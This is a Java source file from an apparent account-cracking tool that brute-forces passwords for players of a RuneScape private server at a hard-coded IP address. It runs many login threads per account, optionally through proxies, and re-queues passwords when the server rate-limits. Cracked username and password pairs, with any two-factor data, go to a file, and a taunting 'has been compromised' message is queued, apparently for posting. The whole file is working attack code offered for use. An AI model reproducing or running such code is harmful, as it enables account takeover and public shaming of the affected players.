package aniski.rs;

import aniski.flags.impl.Crack;
import aniski.flags.impl.CrackBulk;
import aniski.rs.net.ProxyManager;
import aniski.rs.net.RSSocket;
import aniski.rs.net.Stream;
import aniski.rs.player.Player;
import aniski.rs.servers.GodzPk;
import aniski.rs.utils.TextEditor;
import aniski.rs.utils.ThreadFactory;

import java.io.IOException;
import java.net.InetAddress;
import java.net.Socket;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

/**
 * Created by Kai on 04/04/2016.
 *
 * @ Jet Kai
 */
public class LoginEncoder {

    private CrackBulk crackBulk;
    private Crack crack;

    private final ProxyManager proxyManager = new ProxyManager();

    // Creates threads for login attempts
    public void createLoginThreads(Player player, int threads, CrackBulk bulk, boolean twoFactorCrack, int startupDelay) {
        this.crackBulk = bulk;

        System.out.println(getStore().getStoredPasswords().size());
        if(player.getPasswords() != null && player.getPasswords().size() > 0) {

            System.out.println("Starting cracking script...");
            System.out.println("Connecting to " + getStore().getIpAddress() + ":" + getStore().getPort());

            //Sets the size of total passwords loaded (Integer)
            getStore().setTotalPasswordsLoaded(getStore().getStoredPasswords().size());

            //player.checksPerSecond();
            player.sendPasswordUpdateThread();

            for (int i = 0; i < threads; i++) {
                int finalI = i;
                ThreadFactory thread = new ThreadFactory();
                player.addThread(thread);

                Executors.newSingleThreadScheduledExecutor(thread).scheduleAtFixedRate(() -> {

                    Stream aStream_847 = Stream.create(30000);
                    Stream inStream = Stream.create(30000);
                    Stream stream = Stream.create(30000);

                    if (player.getPasswords() == null || player.getPasswords().size() <= 0) {

                        System.out.println("Failed to crack " + player.getUsername() + " with the passwords in the file.");

                        //Removes the player from the global Players list, as we can't login to their account
                        getStore().getStoredUsers().remove(player.getUsername());
                        player.setFailedLogin(true);
                        player.emptyPasswords();

                        for (ThreadFactory playerThread : player.getThreads())
                            playerThread.stopThreads();
                        return;
                    }

                    while (!player.isLoggedIn() && !player.isFailedLogin())
                        login(player, true, stream, inStream, aStream_847, finalI, twoFactorCrack);


                }, startupDelay, 3, TimeUnit.SECONDS);
            }
        } else
            System.out.println("(!) You must load the password file first by typing \"rsps passwords\"");
    }

    private void login(Player player, boolean flag, Stream stream, Stream inStream, Stream aStream_847, int threadId, boolean twoFactorCrack) {

        if(player.getPasswords().size() == 0) {
            player.setFailedLogin(true);
            return;
        }

        boolean usingProxies = false;
        RSSocket rsSocket = null;

        if(usingProxies) {
            rsSocket = proxyManager.loadRSSocketProxy("38.89.142.141", 43594);
        } else {
            try {
                rsSocket = new RSSocket(new Socket(InetAddress.getByName("38.89.142.141"), 43594));
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        String password = player.getPasswordInOrder(threadId);
        ServerManager serverManager = null;
        try {

            String username = player.getUsername().replaceAll("_", " ");

            if(password == null)
                return;

            player.setLastPassword(password);

            //Init socketstream
            serverManager = new GodzPk(username, password, stream, inStream, aStream_847, getStore(), flag, rsSocket);
            serverManager.initSocketRequest();

            int responseCode = serverManager.getResponseCode();
            if(serverManager.getRSSocket() != null)
                serverManager.getRSSocket().close();

            System.out.println(username+":"+password+" " +
                    "| RSP: ["+responseCode+"] " +
                    "| TF: ["+serverManager.getTwoFactor()+"] " +
                    "| CPS <F USER>: ["+player.getChecksPerSecond()+"] " +
                    "| RP <F USER>: ["+player.getPasswords().size()+"] " +
                    "| TR <F USER>: ["+player.getRemainingTime()+"]");
            if (responseCode == 2 /** 2 = Login Success **/ || responseCode == 23/** 23 = IP BAN  (Still successful on Ruse LUL)**/ || responseCode == 27) {
                if(!player.isLoggedIn() && !player.isFailedLogin()) {

                    //Removes user from the Global List & Players.txt file since we have got the login info
                    getStore().getStoredUsers().remove(username);
                    TextEditor.removeUserFromFile(username.replaceAll(" ", "_"));
                    System.err.println("removing from file: "+username);
                    //removeUsernameFromFile();
                    player.setLoggedIn(true);
                    player.emptyPasswords();

                    System.out.println("Success: " + password);
                    System.out.println("# PASSWORD CRACKED SUCCESSFULLY #");
                    System.out.println("Username: \"" + username + "\" | Password: \"" + password + "\".");

                    TextEditor.writePasswordToFile(username, password, null);

                    System.out.println("Successfully removed the user "+username+" from the players.txt file & active user list.");

                    String command = "rsps-crackedaccount";
                    String message = username + ", has been compromised on the RSPS **"+Store.getRspsToCrack().toUpperCase()+"** — Maybe use a better password next time?";
                    TextEditor.writeCommandToFile(command + ":" + username+";"+password + ":" + message);
                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                        //e.printStackTrace();
                        System.out.println("Error sleeping thread.");
                    }
                }
                return;
            }
            if (responseCode == 3) {//Invalid username or password P
                // getStore().getStoredUsers().remove(username);
                // player.setLoggedIn(true);
                //  player.emptyPasswords();
                return;
            }
            if (responseCode == 4) { //Banned account
                if(!player.isLoggedIn() && !player.isFailedLogin()) {
                    getStore().getStoredUsers().remove(username);
                    TextEditor.removeUserFromFile(username.replaceAll(" ", "_"));
                    System.err.println("removing from file: "+username);
                    //removeUsernameFromFile();
                    player.setLoggedIn(true);
                    player.emptyPasswords();

                    System.out.println("Success: " + password);
                    System.out.println("# PASSWORD CRACKED SUCCESSFULLY #");
                    System.out.println("Username: \"" + username + "\" | Password: \"" + password + "\".");

                    TextEditor.writePasswordToFile(username, password, null);

                    System.out.println("Successfully removed the user "+username+" from the players.txt file & active user list.");

                    String command = "rsps-crackedaccount";
                    String message = username + ", has been compromised on the RSPS **"+Store.getRspsToCrack().toUpperCase()+"** — Maybe use a better password next time?";
                    TextEditor.writeCommandToFile(command + ":" + username+";"+password + ":" + message);
                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                        //  e.printStackTrace();
                        System.out.println("Error sleeping thread.");
                    }
                }
                return;
            }
            if (responseCode == 5) {
                //Thread.sleep(10000);
                if(!player.isFailedLogin() && !player.isLoggedIn()) {
                    //Unable to crack, due to player already being logged in - Skip to next account ? Display error for now.

                    //getStore().getStoredUsers().remove(username);
                    //TextEditor.writeToFile("loggedIn.txt", username.replaceAll(" ", "_") + "\n");
                    // TextEditor.removeUserFromFile(username.replaceAll(" ", "_"));
                    player.getPasswords().add(0, password);
                    //  player.setFailedLogin(true);
                    //  player.emptyPasswords();


                   /* getStore().getStoredUsers().remove(username);
                    getStore().getStoredUsers().add(username);

                    getStore().setHasLoggedIn(true);
                    clearStoredPasswords();*/

                   /* getStore().getStoredUsers().remove(username);
                    player.setFailedLogin(true);
                    player.emptyPasswords();*/
                    System.err.println("Your account is already logged in, Try again in 60 secs....");
                    System.out.println("Total Passes: "+player.getPasswords().size());
                    System.out.println("Response is coming from:"+username);
                    //Read users that are logged in, back to the bottom of the list
                    /*try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                      //  e.printStackTrace();
                        System.out.println("Error sleeping thread.");
                    }*/
                }

                return;
            }
            if (responseCode == 6) // System.out.println("MoparScape has been updated!", false);
                return;
            if (responseCode == 7) // System.out.println("This world is full.", false);
                return;
            if (responseCode == 8) // System.out.println("Unable to connect, Login server offline..", false);
                return;
            if (responseCode == 9) {
                try {
                    Thread.sleep(1000);
                } catch (InterruptedException e) {
                    //  e.printStackTrace();
                    System.err.println("LOGIN LIMIT EXCEEDED!!! RESET IP");
                }
               /* if(!player.isLoggedIn() && !player.isFailedLogin()) {
                    player.setFailedLogin(true);
                    System.out.println("Login limit exceeded, Too many connections from your address..");
                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                      //  e.printStackTrace();
                        System.out.println("Error sleeping thread.");
                    }
                    player.emptyPasswords();
                   // getStore().setStoredUsers(new ArrayList<>());
                }*/
                return;
            }
            if (responseCode == 10) // System.out.println("Unable to connect, Bad session id..", false);
                return;
            if (responseCode == 11) // System.out.println("Login server rejected session, Please try again..", false);
                return;
            if (responseCode == 12) // System.out.println("You need a members account to login to this world.", false);
                return;
            if (responseCode == 13) // System.out.println("Could not complete login.", false);
                return;
            if (responseCode == 14) // System.out.println("The server is being updated, Please wait 1 minute and try again..", false);
                return;
            if (responseCode == 15) // System.out.println("Unknown Login Success", false);
                return;
            if (responseCode == 16) // System.out.println("Login attempts exceeded, Please wait 1 minute and try again..", false);
                return;
            if (responseCode == 17) // System.out.println("You are standing in a members-only area.", false);
                return;
            if (responseCode == 20) // System.out.println("Invalid loginserver requested", false);
                return;
            if (responseCode == 21) // System.out.println("You have only just left another world, Your profile will be transferred in: " + k1 + " seconds");
                //for (int k1 = socketStream.read(); k1 >= 0; k1--)
                //login(username, flag, stream, inStream, aStream_847, threadId);
                return;

            if(responseCode == 33) { //Simplicity 2fa
                if(!twoFactorCrack) {
                    getStore().getStoredUsers().remove(username);
                    TextEditor.removeUserFromFile(username.replaceAll(" ", "_"));
                    System.err.println("removing from file: " + username);
                    //removeUsernameFromFile();
                    player.setLoggedIn(true);
                    player.emptyPasswords();

                    System.out.println("Success: " + password);
                    System.out.println("# PASSWORD CRACKED SUCCESSFULLY (WARNING: HAS 2FA) #");
                    System.out.println("Username: \"" + username + "\" | Password: \"" + password + "\".");

                    TextEditor.writePasswordToFile(username, password, serverManager.getTwoFactor());

                    System.out.println("Successfully removed the user " + username + " from the players.txt file & active user list.");

                    String command = "rsps-crackedaccount";
                    String message = username + ", has been compromised on the RSPS **" + Store.getRspsToCrack().toUpperCase() + "** — Maybe use a better password next time?";
                    TextEditor.writeCommandToFile(command + ":" + username + ";" + password + ":" + message);
                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                        //  e.printStackTrace();
                        System.out.println("Error sleeping thread.");
                    }
                }
                return;
            }
            if(responseCode < 1) { // System.out.println("Failed login, adding back to the list (ThreadId) "+threadId+": "+password);
                player.getPasswords().add(0, password);
                return;
            }
            player.getPasswords().add(0, password); // System.out.println("Unexpected server response, Please try using a different world.", false);
            return;
        } catch(IOException _ex){
            if (serverManager != null)
                serverManager.getRSSocket().close();
            player.getPasswords().add(0, password);
            System.out.println("Socket Connection Error 2..."); //Connecting Throttled (Socked Issue)
        } finally {
            if (serverManager != null)
                if (serverManager.getRSSocket() != null)
                    serverManager.getRSSocket().close();
        }
        player.getPasswords().add(0, password);
        System.out.println("Error connecting to server!");
    }

    public Store getStore() {
        if(crackBulk != null)
            return crackBulk.getStore();
        else if(crack != null)
            return crack.getStore();
        return null;
    }

    public void setCrack(Crack crack) {
        this.crack = crack;
    }
}
